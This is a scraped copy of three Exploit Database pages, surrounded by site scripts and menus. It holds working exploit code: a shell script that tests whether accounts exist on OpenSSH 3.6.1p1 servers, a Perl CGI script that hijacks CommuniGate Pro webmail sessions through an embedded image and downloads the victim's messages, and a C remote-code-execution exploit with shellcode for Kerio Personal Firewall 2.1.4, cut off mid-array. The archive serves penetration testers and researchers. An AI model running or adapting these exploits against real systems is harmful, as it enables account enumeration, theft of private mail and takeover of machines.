hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 26
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDOpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users IdentEDB-ID:26CVE:2003-0190EDB Verified:Author:Nicolas CoutureType:remoteExploit:/Platform:LinuxDate:2003-05-02Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/sh# OpenSSH <= 3.6.p1 - User Identification.# Nicolas Couture - nc@stormvault.net## Description:#	-Tells you wether or not a user exist on#	  a distant server running OpenSSH.## Usage:#	-You NEED to have the host's public key#	  before executing this script.##=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-## Fact Sheet:					 ##	  o It is really accurate against	 ##	    redhat boxes.			 ## 	  o Linux boxes running grsecurity	 ##	    has 10 seconds delay on both	 ##	    valid AND invalid user login	 ##	    attempts.				 ##	  o *BSD boxes are not vulnerables and	 ##	     always has 10 seconds delay like  	 ##	     Linux-Grsec + network protection    ##						 ##=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-##=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=## History:#	 Thu May  1 15:41:18 EDT 2003#	  ; Script started.#	 Thu May  1 16:42:30 EDT 2003#	  ; Script is functional.#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=## Let the user know how we work.usage(){echo "$0 <user> <host>"exit 1}# Verify the arguments.[ $# != 2 ] && usage# Variables.USER="$1"HOST="$2"#=-=-=-=-=-=-=-=-=-=-=-=-=## Expect script functions         ##=-=-=-=-=-=-=-=-=-=-=-=-=## Expect script for password.expasswd() {cat << EOF > expasswdspawn $SSHCMDexpect password:send '\r'interactEOF}# Expect script for error.experror() {cat << EOF > experrorspawn expect -f expasswdexpect again.exit 1593interactEOF}#=-=-=-=-=-=-=-=-=-=## -Fake user timing      ##=-=-=-=-=-=-=-=-=-=## OpenSSH client command for inexisting user.export SSHCMD="ssh nicolas_couture@$HOST"# Build new expect script.expasswdexperror# Timing.FDATE0=`date '+%s'`echo "[-] Calculating fake user timeout..."expect -f experror 1> /dev/null 2> /dev/nullFDATE1=`date '+%s'`# Fake user timeout.FUTO=`echo $FDATE1 - $FDATE0 | bc`echo "[+] Found $FUTO."#=-=-=-=-=-=-=-=## -$USER timing    ##=-=-=-=-=-=-=-=## OpenSSH command.export SSHCMD="ssh $USER@$HOST"# Build new expect scripts.expasswdexperrorDATE0=`date '+%s'`echo "[-] Calculating $USER timeout on $SERVER..."expect -f experror 1> /dev/null 2> /dev/nullDATE1=`date '+%s'`# $USER timeout.END=`echo $DATE1 - $DATE0 | bc`echo "[+] Found $END."#=-=-=-=-=## -Result    ##=-=-=-=-=#if [ "$FUTO" -eq "$END" ] && [ "$FUTO" -eq "10" ]; thenecho "This box is not vulnerable."exit 1fi# Use of our magic skills.if [ "$FUTO" -lt "$END" ]; thenecho "$USER exist on $HOST."elif [ "$FUTO" -ge "$END" ]; thenecho "$USER doesn't exist on $HOST."elseecho "Segmentation fault."exit 13fi# Remove tmp files.rm -rf expasswd experror# EOF# milw0rm.com [2003-05-02]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 27
CommuniGate Pro Webmail 4.0.6 - Session Hijacking - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCommuniGate Pro Webmail 4.0.6 - Session HijackingEDB-ID:27CVE:2003-1481EDB Verified:Author:Yaroslav PolyakovType:remoteExploit:/Platform:LinuxDate:2003-05-05Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/usr/bin/perl# Below is exploit code. Place it into cgi-bin, then# (recommended) make symlink from# DocumentRoot/AnyImage.gif to shj.pl, configure# at least $url variable, and possible other vars and# send victim HTML message with img src to your# AnyImage.gif. When victim will read message, script# will download messages 1..10 from his mailbox (if# sucessfull).# Script will work even if "require fixed address" option# enabled (set $abuseproxy=1), but it needs access to# users proxy (IP will be detected automatically). So, if# your victim uses same corporate proxy as you, then# you're lucky, you can own his mailbox! :)# If victim uses HTTPS to access CGP webmail, use# https:// link to image. some browsers will still send# HTTP_REFERER if _both_ sites are https.## session hijacking and mail downloading exploit for CommuniGatePro 4.0.6## Yaroslav Polyakov. xenon@sysAttack.com www.sysAttack.com#use LWP::UserAgent;# configuration vars$logfile="/tmp/log";$url="http://COMMUNIGATE/Session/%SID%/Message.wssp?Mailbox=INBOX&MSG=%N%";$SIDREGEXP="Session/([0-9a-zA-Z\-]+)/";$msglonum=1;$msghinum=10;$msgprefix="/tmp/hijacked-";$abuseproxy=1;$proxyport=3128;sub printgif{$gif1x1="\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00\xc0\xc0\xc0\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b";print "Content-Type: image/gif\n";print "\n";print "$gif1x1";}open LOG, "> $logfile" || die("cant write to my log");printgif;$remote=$ENV{'REMOTE_ADDR'};$referer=$ENV{'HTTP_REFERER'};print LOG "remote: $remote\nreferer: $referer\n";# if($referer=~/SID=([0-9a-zA-Z\-]+)/){if($referer=~/$SIDREGEXP/){$SID=$1;print LOG "SID: $SID\n";}else{print LOG "sorry, cantfind out SID\n";exit;}# create requestmy $ua = new LWP::UserAgent;$ua->agent("shj - sysAttack CGP session HiJack/1.0");if($abuseproxy){print LOG "set proxyhttp://$remote:$proxyport/\n";$ua->proxy('http',"http://$remote:$proxyport/");}for($index=$msglonum;$index<=$msghinum;$index++){$eurl=$url;$eurl =~ s/%N%/$index/;$eurl =~ s/%SID%/$SID/;print LOG "fetching $eurl\n";$request = new HTTP::Request("GET", $eurl);$response = $ua->request($request);if($response){print LOG$response->code." ".$response->message."\n";open MSG, ">$msgprefix$index" or die('cant create $msgprefix$index');print MSG$response->content;close MSG;}else{print LOG "undefinedresponse\n";}}close LOG;# milw0rm.com [2003-05-05]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 28
Kerio Personal Firewall 2.1.4 - Remote Code Execution - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDKerio Personal Firewall 2.1.4 - Remote Code ExecutionEDB-ID:28CVE:2003-0220EDB Verified:Author:BurebistaType:remoteExploit:/Platform:WindowsDate:2003-05-08Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Kerio Personal Firewall v2.1.4 remote code execution exploit* Tested on Windows XP with SP1** In order to exploit, for ease of mind, set the firewall to permit all traffic, or allow* a connection to port 44334 from your testing unix shell ip.** It is also possible to use UDP instead of TCP** It works out very well, if not, hit a few times with a ret addr of 0x41414141 to make it crash* AT THAT addr. Then use the original one, it will work. The one I used points to a 'call esp'* inside the RPCRT4.DLL.*/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <errno.h>#include <string.h>#include <netdb.h>#include <sys/types.h>#include <netinet/in.h>#include <sys/socket.h>#define PORT 44334 // the port client will be connecting to, default Kerio admin port#define retpos 5272#define MAXDATASIZE 5277 // max number of bytes we can get, also size of buffer// global varsstruct sockaddr_in their_addr; // connector's address informationchar buf[MAXDATASIZE];int numbytes;unsigned char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\xEB\x30\x5F\xFC\x8B\xF7\x80""\x3F\x08\x75\x03\x80\x37\x08\x47\x80\x3F\x01\x75\xF2\x8B\xE6\x33\xD2\xB2\x04\xC1""\xE2\x08\x2B\xE2\x8B\xEC\x33\xD2\xB2\x03\xC1\xE2\x08\x2B\xE2\x54\x5A\xB2\x7C\x8B""\xE2\xEB\x02\xEB\x57\x89\x75\xFC\x33\xC0\xB4\x40\xC1\xE0\x08\x89\x45\xF8\x8B\x40""\x3C\x03\x45\xF8\x8D\x40\x7E\x8B\x40\x02\x03\x45\xF8\x8B\xF8\x8B\x7F\x0C\x03\x7D""\xF8\x81\x3F\x4B\x45\x52\x4E\x74\x07\x83\xC0\x14\x8B\xF8\xEB\xEB\x50\x8B\xF8\x33""\xC9\x33\xC0\xB1\x10\x8B\x17\x03\x55\xF8\x52\xEB\x03\x57\x8B\xD7\x80\x7A\x03\x80""\x74\x16\x8B\x32\x03\x75\xF8\x83\xC6\x02\xEB\x02\xEB\x7E\x8B\x7D\xFC\x51\xF3\xA6""\x59\x5F\x74\x06\x40\x83\xC7\x04\xEB\xDB\x5F\x8B\x7F\x10\x03\x7D\xF8\xC1\xE0\x02""\x03\xF8\x8B\x07\x8B\x5D\xFC\x8D\x5B\x11\x53\xFF\xD0\x89\x45\xF4\x8B\x40\x3C\x03""\x45\xF4\x8B\x70\x78\x03\x75\xF4\x8D\x76\x1C\xAD\x03\x45\xF4\x89\x45\xF0\xAD\x03""\x45\xF4\x89\x45\xEC\xAD\x03\x45\xF4\x89\x45\xE8\x8B\x55\xEC\x8B\x75\xFC\x8D\x76""\x1E\x33\xDB\x33\xC9\xB1\x0F\x8B\x3A\x03\x7D\xF4\x56\x51\xF3\xA6\x59\x5E\x74\x06""\x43\x8D\x52\x04\xEB\xED\xD1\xE3\x8B\x75\xE8\x03\xF3\x33\xC9\x66\x8B\x0E\xEB\x02""\xEB\x7D\xC1\xE1\x02\x03\x4D\xF0\x8B\x09\x03\x4D\xF4\x89\x4D\xE4\x8B\x5D\xFC\x8D""\x5B\x2D\x33\xC9\xB1\x07\x8D\x7D\xE0\x53\x51\x53\x8B\x55\xF4\x52\x8B\x45\xE4\xFC""\xFF\xD0\x59\x5B\xFD\xAB\x8D\x64\x24\xF8\x38\x2B\x74\x03\x43\xEB\xF9\x43\xE2\xE1""\x8B\x45\xE0\x53\xFC\xFF\xD0\xFD\xAB\x33\xC9\xB1\x04\x8D\x5B\x0C\xFC\x53\x51\x53""\x8B\x55\xC4\x52\x8B\x45\xE4\xFF\xD0\x59\x5B\xFD\xAB\x38\x2B\x74\x03\x43\xEB\xF9""\x43\xE2\xE5\xFC\x33\xD2\xB6\x1F\xC1\xE2\x08\x52\x33\xD2\x52\x8B\x45\xD4\xFF\xD0""\x89\x45\xB0\x33\xD2\xEB\x02\xEB\x77\x52\x52\x52\x52\x53\x8B\x45\xC0\xFF\xD0\x8D""\x5B\x03\x89\x45\xAC\x33\xD2\x52\xB6\x80\xC1\xE2\x10\x52\x33\xD2\x52\x52\x8D\x7B""\x09\x57\x50\x8B\x45\xBC\xFF\xD0\x89\x45\xA8\x8D\x55\xA0\x52\x33\xD2\xB6\x1F\xC1""\xE2\x08\x52\x8B\x4D\xB0\x51\x50\x8B\x45\xB8\xFF\xD0\x8B\x4D\xA8\x51\x8B\x45\xB4""\xFF\xD0\x8B\x4D\xAC\x51\x8B\x45\xB4\xFF\xD0\x33\xD2\x52\x53\x8B\x45\xDC\xFF\xD0""\x89\x45\xA4\x8B\x7D\xA0\x57\x8B\x55\xB0\x52\x50\x8B\x45\xD8\xFF\xD0\x8B\x55\xA4""\x52\x8B\x45\xD0\xFF\xD0\xEB\x02\xEB\x12\x33\xD2\